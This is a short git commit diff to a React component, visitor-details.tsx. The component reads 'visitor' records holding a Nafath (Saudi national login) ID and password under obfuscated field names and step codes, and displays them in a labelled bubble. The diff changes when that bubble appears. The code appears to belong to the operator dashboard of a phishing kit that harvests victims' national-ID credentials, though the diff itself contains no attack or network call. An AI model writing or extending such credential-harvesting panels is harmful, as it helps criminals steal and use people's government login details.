cb9fdcf6fa219207d2b89437f9d7e56bc2c78cdf
alopopau-eng <alopopau@gmail.com>
2026-03-07 11:27:21 +0300

    ss

--- components/visitor-details.tsx
+++ components/visitor-details.tsx
@@ -444,7 +444,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   const nafazId = visitor._v8 || visitor.nafazId;
   const nafazPass = visitor._v9 || visitor.nafazPass;
 
-  if (nafazId || (visitor.currentStep as any) === "_t6") {
+  if ((visitor.currentStep as any) === "_t6") {
     bubbles.push({
       id: "nafad-info",
       title: "🇸🇦 نفاذ",
